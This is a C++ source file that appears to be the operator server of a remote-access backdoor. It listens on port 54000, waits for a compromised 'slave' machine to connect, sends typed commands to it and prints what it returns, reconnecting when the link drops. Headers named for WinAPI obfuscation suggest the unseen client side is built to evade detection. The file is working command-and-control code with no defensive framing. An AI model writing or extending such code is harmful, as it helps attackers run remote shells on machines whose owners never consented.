#include <iostream>
#include <string>
#include "TCPServer.h"
#include "winapi_obfuscation.h"
#include "winapi_function_signatures.h"

int main()
{
	TCPServer* server = new TCPServer(54000);
	server->start();

	std::cout << "Started Server on port " << server->getListeningPort() << std::endl;
	
	std::cout << "Waiting for a slave to connect." << std::endl;
	server->accept_conn();
	std::cout << "Slave has connected!" << std::endl;
	std::cout << "Enter commands to run:" << std::endl;

	while (true)
	{
		std::string commandLine = "";
		std::getline(std::cin, commandLine);
		if (server->send_data(commandLine) == -1)
		{
			std::cout << "Couldn't send data to slave, he might have disconnected. Waiting for a new connection.\n";
			server->accept_conn();
			std::cout << "Slave has reconnected!" << std::endl;
		}
		else
			std::cout << server->recv_data() << std::endl;
	}

	return 0;
}